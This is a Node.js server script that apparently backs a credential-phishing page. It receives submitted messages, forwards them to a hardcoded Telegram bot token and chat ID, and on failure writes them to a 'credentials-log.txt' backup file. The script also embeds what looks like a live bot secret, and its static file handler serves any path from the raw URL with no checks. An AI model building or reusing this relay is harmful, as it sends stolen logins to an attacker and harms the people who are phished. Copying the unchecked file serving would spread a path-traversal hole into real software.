// Simple Node.js server to proxy Telegram requests and bypass CORS
const http = require('http');
const https = require('https');

const PORT = 8000;
const fs = require('fs');
const path = require('path');

// Function to save credentials to file as backup
function saveToFile(message, reason) {
    try {
        const logFile = path.join(__dirname, 'credentials-log.txt');
        const timestamp = new Date().toISOString();
        const logEntry = `\n${'='.repeat(60)}\n[${timestamp}] - ${reason}\n${'='.repeat(60)}\n${message}\n`;
        
        fs.appendFileSync(logFile, logEntry, 'utf8');
        console.log('💾 Credentials saved to:', logFile);
    } catch (fileError) {
        console.error('❌ Error saving to file:', fileError.message);
    }
}

const server = http.createServer((req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Handle Telegram proxy requests
    if (req.url === '/telegram-proxy' && req.method === 'POST') {
        console.log('\n📨 Received Telegram request at', new Date().toLocaleString());
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const message = data.message || '';
                
                console.log('📝 Message to send:', message.substring(0, 100) + '...');
                
                // Telegram Bot Configuration
                const botToken = '8542135345:AAGbOxP43aqCelD3U0RJQOgb5DxrqdvAi8g';
                const chatId = '6500739596';
                
                // Send to Telegram
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const postData = JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                });
                
                console.log('🔗 Sending to Telegram API...');
                
                const options = {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Content-Length': Buffer.byteLength(postData)
                    },
                    timeout: 10000 // 10 second timeout
                };
                
                let headersSent = false;
                
                const sendError = (errorMsg, hint) => {
                    if (!headersSent) {
                        headersSent = true;
                        res.writeHead(500, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ 
                            ok: false, 
                            error: errorMsg,
                            hint: hint
                        }));
                    }
                };
                
                const telegramReq = https.request(telegramUrl, options, (telegramRes) => {
                    let telegramData = '';
                    
                    console.log('📡 Telegram API Response Status:', telegramRes.statusCode);
                    
                    telegramRes.on('data', (chunk) => {
                        telegramData += chunk;
                    });
                    
                    telegramRes.on('end', () => {
                        if (!headersSent) {
                            headersSent = true;
                            try {
                                const responseData = JSON.parse(telegramData);
                                if (responseData.ok) {
                                    console.log('✅ SUCCESS! Message sent to Telegram!');
                                    console.log('📱 Check your Telegram bot: @Qqqcccb_bot');
                                } else {
                                    console.error('❌ Telegram API Error:', responseData);
                                }
                                res.writeHead(200, { 'Content-Type': 'application/json' });
                                res.end(telegramData);
                            } catch (parseError) {
                                console.error('❌ Error parsing Telegram response:', parseError);
                                res.writeHead(200, { 'Content-Type': 'application/json' });
                                res.end(telegramData);
                            }
                        }
                    });
                });
                
                telegramReq.on('error', (error) => {
                    console.error('❌ Network Error connecting to Telegram:', error.message);
                    console.error('💡 This might mean:');
                    console.error('   1. Internet connection issue');
                    console.error('   2. Telegram API is blocked in your country');
                    console.error('   3. Firewall blocking the connection');
                    
                    // Save to file as backup
                    saveToFile(message, 'telegram_error');
                    
                    sendError(error.message, 'Telegram API might be blocked. Credentials saved to file as backup.');
                });
                
                telegramReq.on('timeout', () => {
                    console.error('❌ Request timeout - Telegram API not responding');
                    console.error('💾 Saving credentials to file as backup...');
                    telegramReq.destroy();
                    
                    // Save to file as backup
                    saveToFile(message, 'telegram_timeout');
                    
                    sendError('Request timeout', 'Telegram API is blocked. Credentials saved to credentials-log.txt');
                });
                
                telegramReq.write(postData);
                telegramReq.end();
                
            } catch (error) {
                console.error('❌ Error processing request:', error.message);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, error: error.message }));
            }
        });
    } else {
        // Serve static files
        // Use modern URL API instead of deprecated url.parse()
        const urlObj = new URL(req.url, `http://localhost:${PORT}`);
        const pathname = urlObj.pathname;
        let filePath = '.' + pathname;
        
        if (filePath === './') {
            filePath = './index.html';
        }
        
        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end('File not found');
            } else {
                res.writeHead(200);
                res.end(data);
            }
        });
    }
});

server.listen(PORT, () => {
    console.log(`\n✅ Server running at http://localhost:${PORT}`);
    console.log(`\n📱 Open your browser and go to: http://localhost:${PORT}/splash.html`);
    console.log(`\n🧪 Test Telegram: http://localhost:${PORT}/test-telegram.html`);
    console.log(`\n📊 Watch this console for Telegram request logs`);
    console.log(`\n🛑 Press Ctrl+C to stop the server\n`);
    console.log('='.repeat(50));
});
